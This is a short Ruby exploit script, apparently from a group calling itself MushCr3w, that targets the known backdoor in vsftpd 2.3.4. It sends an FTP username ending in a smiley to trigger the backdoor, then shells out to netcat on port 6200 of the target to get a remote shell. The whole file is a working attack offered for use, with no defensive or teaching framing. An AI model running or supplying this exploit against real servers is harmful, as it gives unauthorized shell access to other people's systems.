# Code: d0gg.bs3x
# Team: MushCr3w
# CÓPIA NÃO COMÉDIA

# Target: vsftpd 2.3.4

require 'socket' # Import lib

print "Targ37: "
t = gets.chomp # Get Target

begin
	s = TCPSocket.open(t,21) # Connect
	s.print("USER usr:)\n") # Send User; obs: Smile is the exploit
	r = s.read() # Response
	puts r # Print Response
	s.print("PASS passwd\n") # Send Password
	r = s.read() # Response
	puts r # Print Response

	ex = "nc #{t} 6200" # Netcat
	system ex # Start Netcat (Get Reverse Shell)

rescue
	puts "\nErro ao conectar ao servidor\n"
end
